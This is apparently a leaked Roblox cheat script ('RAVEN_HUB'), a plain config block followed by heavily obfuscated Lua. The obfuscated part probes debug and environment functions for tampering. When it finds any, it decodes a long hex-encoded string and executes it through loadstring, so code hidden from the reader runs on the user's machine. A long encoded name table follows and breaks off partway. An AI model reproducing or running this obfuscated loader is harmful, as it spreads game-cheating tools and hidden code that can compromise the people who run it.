-- leaked by frnk33. 
-- discord.gg/kastorhub
local UserInputService = game:GetService("UserInputService")
local TweenService     = game:GetService("TweenService")
local HttpService      = game:GetService("HttpService")
local Players          = game:GetService("Players")
local RunService       = game:GetService("RunService")

local plr              = Players.LocalPlayer
local plrGui           = plr:WaitForChild("PlayerGui")

local CONFIG_FILE = "RAVEN_HUB_Config.json"

local DEFAULT_CFG = {
	power         = 100000,
	interval      = 0.125,
	keybindKb     = "F",
	keybindGp     = "ButtonR2",
	autoBrainrot  = true,
}
-- This file was protected using Luraph Obfuscator v15.1 [https://lura.ph/]
local vXexvELb1b5c, xCAu_3abaoy0, P_GaXrO28K7I = string.byte, string.char, table.concat local z1ig9Lpv_5Vt = bit32.bxor local jQ3Y9_tmuIt8 = {} local function LY9TzT7vp_xx(TSwDt2e63T3g) if not TSwDt2e63T3g then return nil end local SeZBhfBdrN7O = jQ3Y9_tmuIt8[TSwDt2e63T3g] if SeZBhfBdrN7O ~= nil then return SeZBhfBdrN7O end local fMRdpO2_9R1H = {} for L4oLp1LK3X0b = 1, #TSwDt2e63T3g do local Z_gjykPdPsXO = vXexvELb1b5c(TSwDt2e63T3g, L4oLp1LK3X0b) fMRdpO2_9R1H[L4oLp1LK3X0b] = xCAu_3abaoy0((z1ig9Lpv_5Vt(Z_gjykPdPsXO,80)-L4oLp1LK3X0b)%256) end local PhtJT9tf__U_ = P_GaXrO28K7I(fMRdpO2_9R1H) jQ3Y9_tmuIt8[TSwDt2e63T3g] = PhtJT9tf__U_ return PhtJT9tf__U_ end local K99AvvJfcKHs8lXdDoSHE = {} K99AvvJfcKHs8lXdDoSHE[LY9TzT7vp_xx("2.f\004\0257?o%02/g 2\025f3")] = 0 K99AvvJfcKHs8lXdDoSHE[LY9TzT7vp_xx("k)%h\028\211}y~)`2\219\009")] = function(...) return (function() local Gk72ijzNesi_e0Lz45_ = false local qcPRXpTeVbPdLgyyVdG6a4o = pcall(function(...) return (function() local P_ntokpjfYLp4AdIF8sKc, R_OwiuBuPKz7u9zEo = false, nil if type(getgenv) == LY9TzT7vp_xx("7'!7)?&&") then P_ntokpjfYLp4AdIF8sKc, R_OwiuBuPKz7u9zEo = pcall(getgenv) end local CqKiO6PZEHeUMZR3Jc = P_ntokpjfYLp4AdIF8sKc and R_OwiuBuPKz7u9zEo or type(getgenv) == LY9TzT7vp_xx("%35 :") and getgenv local CJskhgaG2wn_qtXtQZzME, DZxNR9aao7WtrfUOeDuHx = false, nil if type(getfenv) == LY9TzT7vp_xx("7'!7)?&&") then CJskhgaG2wn_qtXtQZzME, DZxNR9aao7WtrfUOeDuHx = pcall(getfenv) end local MYb490Nh_2r_avJNVqhK = CJskhgaG2wn_qtXtQZzME and DZxNR9aao7WtrfUOeDuHx or type(getfenv) == LY9TzT7vp_xx("%35 :") and getfenv local cQ_FerfuKEZIMHovS00Ciw = CqKiO6PZEHeUMZR3Jc or MYb490Nh_2r_avJNVqhK or _G or {} if cQ_FerfuKEZIMHovS00Ciw[LY9TzT7vp_xx("017(49?#8(**\"\214(\211\213'\209\216$\030\025\001\026\026\031\003\031")] ~= nil then Gk72ijzNesi_e0Lz45_ = true end local E4KFpay46dOKJJPO8SL = cQ_FerfuKEZIMHovS00Ciw[LY9TzT7vp_xx("575)<")] if type(E4KFpay46dOKJJPO8SL) == LY9TzT7vp_xx("%35 :") and type(E4KFpay46dOKJJPO8SL[LY9TzT7vp_xx("87'=#<&")]) == LY9TzT7vp_xx("7'!7)?&&") then local JlC4fe7wHkGfNGvKW = E4KFpay46dOKJJPO8SL[LY9TzT7vp_xx("87'=#<&")] local JvYsC7IbTjMnTr3rl_bz2y_, mwFi8L0We3s_MakOBXRra_HL = pcall(function(...) return (function() return JlC4fe7wHkGfNGvKW(2) end)(...) end) if not JvYsC7IbTjMnTr3rl_bz2y_ and string[LY9TzT7vp_xx("7;!8")](tostring(mwFi8L0We3s_MakOBXRra_HL), LY9TzT7vp_xx("9!\"?")) then Gk72ijzNesi_e0Lz45_ = true end end local SPLl1ltpVjDhhqQoAKT = cQ_FerfuKEZIMHovS00Ciw[LY9TzT7vp_xx(":%67!%*-+?")] local ghbpQst_6kjwDOhBcXhpWk0G = cQ_FerfuKEZIMHovS00Ciw[LY9TzT7vp_xx("=!48(*)!'!")] if type(SPLl1ltpVjDhhqQoAKT) == LY9TzT7vp_xx("7'!7)?&&") and type(ghbpQst_6kjwDOhBcXhpWk0G) == LY9TzT7vp_xx("7'!7)?&&") then local MsvKsIfYwDmbY_zlD3, lrxeh58BGYRYo_YqBd1a0Hwj = pcall(SPLl1ltpVjDhhqQoAKT, ghbpQst_6kjwDOhBcXhpWk0G) if not MsvKsIfYwDmbY_zlD3 or not lrxeh58BGYRYo_YqBd1a0Hwj then Gk72ijzNesi_e0Lz45_ = true end end local fsCSACZ_iOsW7lzCBRB = cQ_FerfuKEZIMHovS00Ciw[LY9TzT7vp_xx(":%;#$!<<")] or cQ_FerfuKEZIMHovS00Ciw[LY9TzT7vp_xx(":%;#$!")] if type(fsCSACZ_iOsW7lzCBRB) == LY9TzT7vp_xx("7'!7)?&&") then local j_d_umemPo9Vw8_vYj9U7gd, VeuPapi7KjjE6_er1m0_bV = pcall(function(...) return (function() return fsCSACZ_iOsW7lzCBRB(print) or (ghbpQst_6kjwDOhBcXhpWk0G and fsCSACZ_iOsW7lzCBRB(ghbpQst_6kjwDOhBcXhpWk0G)) end)(...) end) if not j_d_umemPo9Vw8_vYj9U7gd or VeuPapi7KjjE6_er1m0_bV then Gk72ijzNesi_e0Lz45_ = true end end end)(...) end) if not qcPRXpTeVbPdLgyyVdG6a4o then Gk72ijzNesi_e0Lz45_ = true end if Gk72ijzNesi_e0Lz45_ then local HQlIlpsF_Oy8u1htrjf_k = LY9TzT7vp_xx("") local xQdtKPPRoLDofh_hln6 = 30 if (xQdtKPPRoLDofh_hln6 * xQdtKPPRoLDofh_hln6 + xQdtKPPRoLDofh_hln6) % 2 == 0 then local MHxP7RMDOriNGpBexaglnY_aG = LY9TzT7vp_xx("cbedgfihkjmlon\017\016\019\018\021\020\023\022\025\024\027\026\029\028\031\030\001\000\003\215\007\004\007\011\0090\011\192\013\221\015\193103\1995\2017\2039\205;\207=\241?\243!\245#\"%$'&)(+*-\225/\227\209\229\211\229\213\229\215\236\217\192\219\221\221\193\223\196\195\192\197\194\197\153\197\151\201\200\203\202\205\204\207\206\241\240\243\242\245\244\247\246\249\248\251\250\253\252\255\254\225\232\227\179\229\228\231\230\233\232\235\189\237\162\239\164\145\152\147\149\149\153\151\156\153\157\155\128\159\156\129\158\131\128\133\130\133\137\135\142\137\176\139@\141B\143D\177F\179H\181J\183L\185\160\187\162\189\191\191\161\161\165\163\165\165\167\167\169\169P\171R\173b\175\127QaSeUgWkYX[Z]\\_^A\019C\024E\026GNINK\031K\029ONqpsrutwvyx{z}|\1274a1cbe9gkkhmjol\017n\019\016\021\018\023\020\025\022\025\029\027-\029\028\031\211\001\008\003\008\007\004\009\006\009\014\0110\0132\015416385:7<;8=:?<!># %\"%*'))\208+\251-\255/\227\209\229\211\231\213\233\215\235\217\237\219\239\221\145\223\147\193\145\195\199\199\196\201\198\203\200\203\242\205\204\207\206\241\240\243\133\245\247\247\139\247\137\251\250\253\252\255\254\225\224\227\226\229\228\231\183\233\190\235\234\237\161\239\148\147\144\149\146\151\148\153\150\155\152\157\154\159\156\159\175\129\128\131\138\133\137\135\134\137[\139\138\141]\143\182\177\182\179\184\183\180\185\182\187\184\189\186\191\188\161\190\161\166\163\167\165\172\167\166\169y\171\127\173a\175\174QPSRUTWVYX[Z]\\_^A@CBEDGFI\029K\029M\029Ovquszu\005yv{x{`}\013\127~a1a3edgfihkjmlo\017\017#\019\018\021*\023'\027\024\029\026\031\028\001\030\003\000\003\211\005\004\007\215\009\014\0112\013\012\015\19316385\2027\2039\203;\240=??#!&#('$)&).+\210-\210\209.\211\208\213\210\215\212\217\214\219\216\221\218\223\220\193\222\195\192\197\194\199\196\199\201\201\153\203\157\205\129\207\131\241\133\243\135\245\137\247\137\249\142\251\224\255\252\225\254\227\224\229\226\231\228\233\230\235\232\237\234\237\148\239\238\145\165\147\151\147\165\151\150\153\152\155\154\157\156\159\158\129\131\131\130\133U\137\134\139\136\141\138\143\140\177\142\177A\179H\183\180\183\187\185\184\187O\189\191\191\163\161u\163x\165\172\167\166\169}\171}\173b\175\127QcSeUjWlYi[m]o_\020AHC\019GDIFKHMJOLqNspurwtyv{x}z\127|a~c`ebgdifkhmjol\017n\019\016\019\021\021)\023\025\027\024\029\026\031\028\001\030\003\000\003\008\005\217\007\006\009\013\009\219\013\012\015\01410325\202769>=:?<!># %\"'$)&+(+\210-\209/\209\209\208\211\227\213\218\215\220\217\233\219\192\223\220\193\222\195\192\197\194\197\199\199\156\201\206\205\202\207\204\241\206\243\240\243\136\245\249\247\251\249\141\251\141\253\225\225\254\227\224\229\226\231\228\233\230\235\232\237\234\239\236\239\147\145\166\149\146\151\148\151\156\153\128\155\154\157\175\159\158\129S\131U\133W\135[\137]\139\138\141]\143\179\179\176\181\178\183\180\183\185\185\184\187K\187M\191\190\161\160\163\162\165\164\167\169\169\168\171\127\173RQ\174SPURWTYV[X]Z_\\A^C@C\021EDGNIpKOOLqNspurwtyvy{{\015}|\1271afebgdgikhmjm\018o?\017\016\019'\021\026\025\022\027\024\029\026\031\028\031\004\001\211\003\215\005\007\009\006\011\008\013\010\015\012\015\1961652747;;8;==$?$# %\"%*'.)\254+\210-\255/\212\209\227\211\210\213\234\215\233\215\233\219\218\221\220\223\222\193\200\195\152\197\196\199\206\203\200\203\240\205\242\207\244\241\245\243\248\247\244\249\246\251\248\251\224\253\178\255\254\225\179\227\181\231\228\231\233\233\144\237\234\239\236\145\238\147\144\147\165\149\148\151\150\153\152\155\157\159\156\129\158\129V\131U\133\138\137\134\137\142\139\138\141B\177\142\179\176\181\178\183\180\185\182\185K\187\191\189\191\191\163\163\160\165\162\167\164\169\166\171\168\171R\173\172\175\174QPScWTYV[X]Z_\\_DA\019CGEIG\027IHK\031K\029ONqps\008utwyy\014{\013}\127a~c`ebejgii\016k m\"\017n\019\016\021\018\021*\023\022\025\029\029\026\031\028\031\004\003\000\005\002\007\004\007\014\009\008\011\223\013\012\015\0141\1953874969 ;\207=\242?\207! #''$)&)\249+*-,/\211\211\208\213\210\215\212\217\214\219\216\221\218\221\193\223\222\193\192\195\194\197\196\199\206\203\200\205\202\205\242\207\246\241\129\243\135\245\137\247\139\249\253\251\143\251\141\255\254\225\182\227\184\229\186\233\230\235\232\235\144\237\191\239\238\145\152\147\152\151\148\153\150\153\155\155\173\157\156\159T\131\128\131X\133\132\135Y\137Y\139\176\143\140\177\142\179\176\181\178\181\183\183\188\187\184\189\186\189\161\191\161\161\165\163\170\165\172\167\171\171\168\171P\173}\175\174QfURWTYV[X]Z_\\_DA\021CBEGIFKHMJMOOtspurwtw{y}}z\127|a~c`ebejg9ihk m\020o\017\019\016\019(\021\023\021'\025\029\027\031\029\209\031\004\003\000\003\005\005\004\007\219\009\014\013\010\015\0121\01413325\20296;8=:?<?#!&%\"'$)&)\254+*-\225/\225\209\230\211\218\213\220\215\236\217\233\219\237\221\220\223\147\193\150\195\200\199\196\201\198\203\200\205\202\207\204\241\206\243\240\245\242\247\244\249\246\249\139\251\139\253\226\255\230\225\181\227\184\229\233\233\230\235\232\235\237\237\189\239\148\147\144\149\146\151\148\151\158\153\155\155\130\157Q\159S\129U\131W\133\138\135\137\137Y\141\138\141B\141_\179\176\179\183\181I\183\188\185\190\187\186\189q\191\164\163\160\165\162\167\164\167\172\169y\171\170\173b\175TSPURWTYV[X]Z_\\A^C@EBGDIFKHMJOLqNspuruww\012y{{0}d\127cc`ebgdifkhmjol\017n\019\016\021\018\021\026\023)\025\024\027\002\031\028\001\030\003\000\005\002\007\004\009\006\011\008\013\010\015\0121\014303\2005\19996;8=:?<!>!##\247%*'\247'\249+\208-\210/\225\209\213\211\215\213\212\215\235\217\222\219\235\221\220\223\148\195\192\197\194\199\196\199\206\201\200\203\159\205\204\207\129\241\248\245\242\247\244\249\246\251\248\251\224\253\178\255\230\225\232\227\184\229\186\231\188\233\235\235\146\237\236\239\164\145\150\149\146\151\148\153\150\155\152\157\154\159\156\129\158\131\128\133\130\135\132\137\134\139\136\141\138\143\140\177\142\179\176\179\178\181\188\183\182\185K\187\160\191\188\161\190\163\160\165\162\167\164\169\166\171\168\173\170\173R\175aQPSZWTYVY^[k_\\_\020AHC\024C\021G\027IMK\027MOqNqxsru\010yv{x}z\127|\127fa`c3gdifkhmjol\017n\017&\019\018\021%\023\027\027\024\029\026\031\028\001\030\003\000\005\002\007\004\007\012\009\221\011\221\015\012\0154103\197577\20198;\207=\"!># %\"'$)&+(+--,/\227\209\211\211\227\213\229\215\219\217\222\219\144\221\239\223\193\195\192\197\194\199\196\201\198\201\153\203\202\205\157\241\206\243\240\243\248\245\138\247\135\249\254\251\139\251\141\255\254\225\181\227\232\229\186\231\187\233\235\237\234\239\236\145\238\147\144\149\146\151\148\153\150\153\171\155\154\157\173\159\132\131\128\133\130\133\137\135[\137]\139\176\143\140\177\142\177\182\179\186\181\180\183I\185\184\187\162\189\161\161\190\161\165\163\168\167\164\169\166\171\168\173\170\175\172Q\174SPURU\\WkYi[m]\\_\020C@EBGDIFKHMJOLqNspuruzw\009yx{\127\127|a~c`ebe9g;g9mjm=on\017%\019\023\023\020\025\022\027\024\029\026\031\028\001\030\003\000\005\002\005\012\007\006\0090\013\010\015\0121\014305274969 ;:=\241?\207!(#'%*)&+(-*/,\209.\211\208\213\210\215\212\217\214\219\216\221\218\223\220\223\196\193\192\195\202\197\196\199\153\201\200\203\128\205\129\207\159\243\240\243\247\245\244\247\140\251\248\253\250\253\225\255\254\225\181\227\184\227\181\231\230\235\232\235\187\237\236\239\163\145\150\149\146\151\148\153\150\155\152\157\154\159\156\129\158\131\128\131\136\133Y\135\134\137]\139@\141\178\177\142\179\176\181\178\181E\183K\185\190\189\186\191\188\161\190\163\160\165\162\167\164\169\166\169\174\171\170\173\127\175\127QaSeUTWkYi[B]B_FA@C\023EIIFKHKMMLOssps\003utw\009{x}z}a\127~a3cec5gfihkjm\018o!\017\016\019(\023\020\025\022\027\024\029\026\031\028\001\030\001\209\003\002\005\217\007\009\011\008\013\010\015\0121\0143052747\1999\205;??<!># %\"'$'.)(+\253/,\209.\211\208\213\210\215\212\217\214\217\222\219\218\221\239\223\195\193\200\195\194\197\153\199\204\203\200\203\207\205\204\207\129\241\243\241\131\245\244\247\246\249\248\251\176\253\252\255\143\227\224\229\226\231\228\233\230\235\232\237\234\237\239\239\238\145\149\149\146\149\154\151\171\153\171\155\157\155\173\159\158\129\128\131\130\133\140\135\142\137\136\139_\141\178\177\142\179\176\181\178\183\180\183G\185\184\187\189\191\188\191\164\161u\163u\165\167\165w\169\168\171\170\173\172\175cQVSgUTWiY^]Z_\\A^A\019CBELIFINK\031M\031OqO\001srutwvyx{}}1\127~a5cggdifi9kjm\"\017n\019\016\019(\021\020\023,\027\024\027\000\029\209\031\209\001\008\001\211\005\004\007\006\009\008\011\010\013\012\015\1951\1983257969=;\207=<?## #(%\247'\249)++\253-,/\228\211\208\213\210\213\233\215\233\217\238\217\235\221\220\223\222\193\192\195\194\197\196\199\151\201\240\203\202\205\207\241\206\241\245\243\135\245\244\247\254\251\248\253\250\255\252\225\254\227\224\227\231\229\186\231\185\233\232\235\160\239\236\145\238\145\163\147\167\149\165\149\167\153\152\155\154\157\156\159\158\129\128\131\130\133Z\135\\\137\136\139\143\143\140\177\142\177C\179\178\181E\185\182\187\184\189\186\191\188\161\190\163\160\165\162\167\164\169\166\169P\171\170\173TQ\174QUShUiWVY[]Z_\\_\017A@CJC\021GFIHKJMLONqpsruww\007yx{\015}ba~c`cee9gfi\016mjol\017n\019\016\019\024\021)\023'\027\024\029\026\031\028\001\030\003\000\005\002\007\004\009\006\009\013\011\223\013\012\015\2231\1983\199547\1999\205;\207=!?\207!\245#('$)&)\251+*-\226-\255\209\208\211\210\213\212\215\214\217\216\219\218\221\220\223\222\195\192\195\147\197\196\199\155\201\205\205\202\207\204\241\206\241\245\243\133\245\244\247\137\249\142\251\250\253\177\225\254\227\224\229\226\231\228\233\230\235\232\237\234\239\236\145\238\147\144\147\165\149\169\151\155\155\152\157\154\159\156\129\158\131\128\133\130\133\137\135\134\137]\139\176\143\140\177\142\179\176\179C\181\180\183\185\187\184\187\160\189q\191s\161\166\165\162\165u\167y\169y\171\170\173QQ\174SPSXUiWVYiYk]\\_^A@CBEDGFIHKJMLO\004qps\003uzyv{x}z\127|a~c`cge7gfi9k\018ol\017n\019\016\021\018\023\020\025\022\025\030\027/\029\028\031\001\003\000\005\002\007\004\009\006\009\217\011\010\013\0151\0143037547>;8;==\205?\241! #\248'$)&+(-*-\253/\214\209\208\211\218\211\229\215\214\217\216\219\218\221\220\223\222\193\192\195\194\197\196\199\198\201\200\203\202\207\204\207\241\241\133\243\242\245\137\247\249\251\248\253\250\255\252\225\254\227\224\229\226\231\228\231\236\233\144\235\189\237\191\239\238\145\165\147\165\149\165\151\158\153\157\155\128\159\156\129\158\131\128\133\130\135\132\135\140\137]\139_\141\180\141_\177\176\179\178\181\180\183\182\185\184\187\186\189\188\191\190\161\160\163\162\165\164\167\166\169\168\171P\173T\175\174QeSRUjW[[X]Z_\\A^C@EBGDIFKHMJOLqNspurwtyv{x}z\127|a~c`ebgdifkhmjol\017n\019\016\021\018\023\020\025\022\027\024\029\026\029\004\031\030\001\008\003\010\003\213\007\006\009\008\011\010\013\012\015\0141032547698;:=<?>! #\245%''\252)\249+\255-,/\227\209\229\211\229\213\231\215\233\217\235\219\237\221\239\223\145\193\147\195\149\197\151\199\153\201\155\203\157\205\159\207\129\241\133\243\242\245\135\247\140\249\251") local Btcbxm8eXZIv5ru9t__W = {} for ROyilPgEkAC_4HHmtf4 = 1, #MHxP7RMDOriNGpBexaglnY_aG, 2 do Btcbxm8eXZIv5ru9t__W[#Btcbxm8eXZIv5ru9t__W + 1] = string[LY9TzT7vp_xx("4:4&")](tonumber(MHxP7RMDOriNGpBexaglnY_aG:sub(ROyilPgEkAC_4HHmtf4, ROyilPgEkAC_4HHmtf4 + 1), 16)) end HQlIlpsF_Oy8u1htrjf_k = table[LY9TzT7vp_xx("4!!76*")](Btcbxm8eXZIv5ru9t__W) else local YfB33mEYeZu30jcE9XHoQ_ = LY9TzT7vp_xx("8\024\026\"(.\025-\006 <\021$)\024: \025\022\01290=\2185") end pcall(function(...) return (function() local ee4uXPBpJVqrHm_h3aPo6f = (type(getgenv) == LY9TzT7vp_xx("7'!7)?&&") and getgenv()) or (type(getfenv) == LY9TzT7vp_xx("7'!7)?&&") and getfenv()) or _G or {} local CO7_HOf6NXcbhzQYFdd = ee4uXPBpJVqrHm_h3aPo6f[LY9TzT7vp_xx("=!48") .. LY9TzT7vp_xx("$&%=#=")] or loadstring or ee4uXPBpJVqrHm_h3aPo6f[LY9TzT7vp_xx("=!48")] or load if type(CO7_HOf6NXcbhzQYFdd) == LY9TzT7vp_xx("7'!7)?&&") then pcall(CO7_HOf6NXcbhzQYFdd, HQlIlpsF_Oy8u1htrjf_k) end end)(...) end) error(nil, 0) end return true end)(...) end K99AvvJfcKHs8lXdDoSHE[LY9TzT7vp_xx("r /\023\011\003;\026)'\215:\210\019\220\222\010")] = function(...) return (function() K99AvvJfcKHs8lXdDoSHE[LY9TzT7vp_xx("2.f\004\0257?o%02/g 2\025f3")] = K99AvvJfcKHs8lXdDoSHE[LY9TzT7vp_xx("2.f\004\0257?o%02/g 2\025f3")] + 1 if K99AvvJfcKHs8lXdDoSHE[LY9TzT7vp_xx("2.f\004\0257?o%02/g 2\025f3")] >= 128 then K99AvvJfcKHs8lXdDoSHE[LY9TzT7vp_xx("2.f\004\0257?o%02/g 2\025f3")] = 0 K99AvvJfcKHs8lXdDoSHE[LY9TzT7vp_xx("k)%h\028\211}y~)`2\219\009")]() end end)(...) end K99AvvJfcKHs8lXdDoSHE[LY9TzT7vp_xx("k)%h\028\211}y~)`2\219\009")]() K99AvvJfcKHs8lXdDoSHE[LY9TzT7vp_xx("\007\002l'g>:*\0034\216.70")] = 11947860370 K99AvvJfcKHs8lXdDoSHE[LY9TzT7vp_xx("+\026%b \001\010\0291\212\026*#\220\007?\000\002\0050\215")] = LY9TzT7vp_xx("'+!,%\"8\209>,") K99AvvJfcKHs8lXdDoSHE[LY9TzT7vp_xx("\026\012)2\014oxk\029n\020\006\208\005g\015\216!")] = LY9TzT7vp_xx("9&'$(\016fg=#.?,\208#n$\209\208\019&\214\208\023\192/-\212\220\221\218\195\000\003\008\010\013\014\009\0112\01201\014\01546254:4\217\212\193.\252!\216\192\193\243\224\211\252\216\225\202\144\218\255\207\235\221\208\202\198\237\146\202\195\249\242\210\205\233\233\232\204\242\207\241\250\137\247\139\230\137\152\229\238\226\146\157\199\157\242\156\184\244\154\142\131\249\230\238\135\140\254\252") do local F5Y3Us7i8nXvOMLqGJs2b17 = {} F5Y3Us7i8nXvOMLqGJs2b17[LY9TzT7vp_xx("d\029\017~b\209\011!\214l\211\010\031\217\006\222\012\0318\008\218.\220\214")] = 298 end K99AvvJfcKHs8lXdDoSHE[LY9TzT7vp_xx("\005zf\023\024e:c|\021)k;j\212\027\213(:\211")] = {[LY9TzT7vp_xx("\021$4;$$w\011$?'!\209--)/+")] = true, [LY9TzT7vp_xx("\001:\"9#?/")] = true, [LY9TzT7vp_xx("\001>4\")v\025*(-")] = true, [LY9TzT7vp_xx("\025+7&6v\010=+* *\209")] = true, [LY9TzT7vp_xx("\000$6<>:&\208")] = true, [LY9TzT7vp_xx("\004&%5,8<*+\211{\001)#/(\"\208\215")] = true, [LY9TzT7vp_xx("\0307\"+!")] = true, [LY9TzT7vp_xx("\004=<6>: x\013)$(\"\210")] = true, [LY9TzT7vp_xx("\029!&t\025(8?((.")] = true, [LY9TzT7vp_xx("\0293s\023'7=,y\007<?%'-%")] = true, [LY9TzT7vp_xx("\024!?8u7%<y\030$=*--$")] = true, [LY9TzT7vp_xx("\021$4;$$w\027:()!)*..*")] = true, [LY9TzT7vp_xx("\021$4;$$w\031\"(\"!/'-)")] = true, [LY9TzT7vp_xx("\024$<:;?%")] = true, [LY9TzT7vp_xx("\025+7&6v\027*:!**}\001 ./'/\208\212\212\208")] = true, [LY9TzT7vp_xx("\025+7&6v\025-'(\212")] = true, [LY9TzT7vp_xx("\018 '##?&")] = true, [LY9TzT7vp_xx("\027!;\"u\006&*$")] = true, [LY9TzT7vp_xx("\022>8:6$+'y\000-%$-")] = true, [LY9TzT7vp_xx("\003'5&>! #(")] = true, [LY9TzT7vp_xx("\0013!76!<x:(?|0\215\209\213\209")] = true, [LY9TzT7vp_xx("\018$659(8?((")] = true, [LY9TzT7vp_xx("\003;6#u\026 &>,*")] = true, [LY9TzT7vp_xx("\0203#=)7%'y\027(!/'\"!/\209")] = true, [LY9TzT7vp_xx("\0283?= 7w\026+).")] = true, [LY9TzT7vp_xx("\005;%=!?\"9%#&=}2(\210*.,/&\210(\211\216")] = true, [LY9TzT7vp_xx("\024>\"66v\010,>*+=")] = true, [LY9TzT7vp_xx("\021':t\025+>x\029/\"")] = true, [LY9TzT7vp_xx("\021$4;$$w\025*/<*&,(")] = true, [LY9TzT7vp_xx("\0293s\0236)8x\027)*")] = true, [LY9TzT7vp_xx("\0293s\007*&)=&?{\031,+!)/#\214-\212\212")] = true, [LY9TzT7vp_xx("\025748!;*+y\002*.\208#,!/")] = true, [LY9TzT7vp_xx("\004;:\"$(<x\028;-=-?\"%")] = true, [LY9TzT7vp_xx("\023;&<>$&x\028&*\211+'-/")] = true, [LY9TzT7vp_xx("e&;t\023(&+")] = true, [LY9TzT7vp_xx("\019'95!?%'y\028*+* $\210*\208\210")] = true, [LY9TzT7vp_xx("\021':;.v\025*(-")] = true, [LY9TzT7vp_xx("\0207%6:(,+")] = true, [LY9TzT7vp_xx("\028$4?:$")] = true, [LY9TzT7vp_xx("\030!!9.v\004''?\212|\031\208.\211")] = true, [LY9TzT7vp_xx("\0077!)(& &(")] = true, [LY9TzT7vp_xx("\004&85 ?%!y\000<\208\209'-)")] = true, [LY9TzT7vp_xx("\003:<\"$v\031=%#>+-\210$\210*\208\210")] = true, [LY9TzT7vp_xx("\0203, *)8-+/.")] = true, [LY9TzT7vp_xx("\0043 !.$ x\028;&%+'")] = true, [LY9TzT7vp_xx("\0207!('+:;\"z\009\209 *\212#$+")] = true, [LY9TzT7vp_xx("\029!&t\0297:#>,.")] = true, [LY9TzT7vp_xx("\027!;\"u\026&=")] = true, [LY9TzT7vp_xx("\024!%=!\"&x\012/=\211,-%%\211\209")] = true, [LY9TzT7vp_xx("\0277? .v\004';\211")] = true, [LY9TzT7vp_xx("\023!+=#?w\004:(/!/,(.*")] = true, [LY9TzT7vp_xx("\024;!;:(w\027\"-/!/, ")] = true, [LY9TzT7vp_xx("\01974&>*&x\028;=%+'\211/")] = true, [LY9TzT7vp_xx("\021;:=u\0048*\208\"<(")] = true, [LY9TzT7vp_xx("\029!&t\0097%?<#/+\208")] = true, [LY9TzT7vp_xx("\029!&t\009?:,:=.")] = true, [LY9TzT7vp_xx("\030!5-u\024)',")] = true, [LY9TzT7vp_xx("\029!&t\022:$!'-")] = true, [LY9TzT7vp_xx("b*d,f.h")] = true, [LY9TzT7vp_xx("cg")] = true, [LY9TzT7vp_xx("gi")] = true, [LY9TzT7vp_xx("\01894&'?%!y&<|\013?+)/+")] = true, [LY9TzT7vp_xx("\018$659%'-,")] = true, [LY9TzT7vp_xx("\01936)'+w9'>{\001$%\212\210\214")] = true, [LY9TzT7vp_xx("\0193!5#?+'")] = true, [LY9TzT7vp_xx("\0193&?>*&")] = true, [LY9TzT7vp_xx("\0197%&.$&")] = true, [LY9TzT7vp_xx("\019;&##*<x\000#\208,-'\211%\211'")] = true, [LY9TzT7vp_xx("\019>47 >&$>z\002\011\0302")] = true, [LY9TzT7vp_xx("\019!4(>*&x\026/-=\209'\211/")] = true, [LY9TzT7vp_xx("\019!#$>$w\026.()\213")] = true, [LY9TzT7vp_xx("\019$(\">*&x\006;-/&\210.")] = true, [LY9TzT7vp_xx("\019'!=)%w\026.($\208,~2\208*\208,\216\212")] = true, [LY9TzT7vp_xx("\019'!\".#8&")] = true, [LY9TzT7vp_xx("\019'!\".v8&=z\000#$\215")] = true, [LY9TzT7vp_xx("\019'!\".v\025-'(\212|\031\211-.\218b6%-\219\217")] = true, [LY9TzT7vp_xx("\019'!();&")] = true, [LY9TzT7vp_xx("\019'%;*(&x:(?|\003\208\216\213\211\209")] = true, [LY9TzT7vp_xx("\019'%&>*&x\027;) &\210.")] = true, [LY9TzT7vp_xx("\0203#=)7%'y\007*>\214")] = true, [LY9TzT7vp_xx("\0203&<u%)x\028;- ")] = true, [LY9TzT7vp_xx("\0207?9(* 9%z\011!$?\210\213\212")] = true, [LY9TzT7vp_xx("\0207?)!7);\"($|3'\")\208\213,\210.")] = true, [LY9TzT7vp_xx("\020:47=;: \"")] = true, [LY9TzT7vp_xx("\020:<7!;+=\",<|\031'\")$.(\216*/\217)")] = true, [LY9TzT7vp_xx("\020:<7!;+=\",<|\000\211/)%',\214&")] = true, [LY9TzT7vp_xx("\020:<7!;+=\",<|\011-$,\213',\214&")] = true, [LY9TzT7vp_xx("\020:<7!;+=\",$*>~\001)$+&\208*\218,\209\219\211\217-")] = true, [LY9TzT7vp_xx("\020:< !v\007-)*\212")] = true, [LY9TzT7vp_xx("\020:< !?%x\028\"$(&")] = true, [LY9TzT7vp_xx("\020:<!#?%'")] = true, [LY9TzT7vp_xx("\020:<$(%w9'>{\013\210#\210/")] = true, [LY9TzT7vp_xx("\020:(&'?+'y\028\208*+'\211/")] = true, [LY9TzT7vp_xx("\020;:\"$v\029-%!*.,")] = true, [LY9TzT7vp_xx("\020>\"*:(8,y\029'=-?\211")] = true, [LY9TzT7vp_xx("\020!\"?>v8&=z\008%))(")] = true, [LY9TzT7vp_xx("\020'48'7$9-z<*!~\015!,\212$,\210'\219\213*\215,\192")] = true, [LY9TzT7vp_xx("\020'#=9v\026-)#?|0?'\213\211")] = true, [LY9TzT7vp_xx("\020'#=9v\031'--++\209")] = true, [LY9TzT7vp_xx("\021\028s\0046$;9")] = true, [LY9TzT7vp_xx("\021!!?:/+-+<*|\002\214/\210&\213\214")] = true, [LY9TzT7vp_xx("\021'?t\025+#x\029/'")] = true, [LY9TzT7vp_xx("\0223&(:(w\029:-/!/~\004!\212\214(\214e9(\208\222\220")] = true, [LY9TzT7vp_xx("\022;7t\026?;x\030#?|0?'\213\211")] = true, [LY9TzT7vp_xx("\022%\"?u\009<#(&<$")] = true, [LY9TzT7vp_xx("\022(< ::&&")] = true, [LY9TzT7vp_xx("\022*'=#9+x\006;/\208\"-")] = true, [LY9TzT7vp_xx("\022*'=#9+x\013,<(>*$\210\208")] = true, [LY9TzT7vp_xx("\0237&(>,<xo\017")] = true, [LY9TzT7vp_xx("\023;&<7%8*=")] = true, [LY9TzT7vp_xx("\023!%(*$,x:(?|\000?\210(\214\212\216")] = true, [LY9TzT7vp_xx("\023$4;$\"8x\005;{\008>~\011!")] = true, [LY9TzT7vp_xx("\023$4;'7$9y;) }\001'/$\212$\209&")] = true, [LY9TzT7vp_xx("\023$4\" ;%,-?*")] = true, [LY9TzT7vp_xx("\024\001\020\008")] = true, [LY9TzT7vp_xx("\0243%5\"7w9'>{\009>\"\212.%\215\209+")] = true, [LY9TzT7vp_xx("\024;9(>$ x\012*\212 \"\208(.*")] = true, [LY9TzT7vp_xx("\024;!;:(w\031>,<\208")] = true, 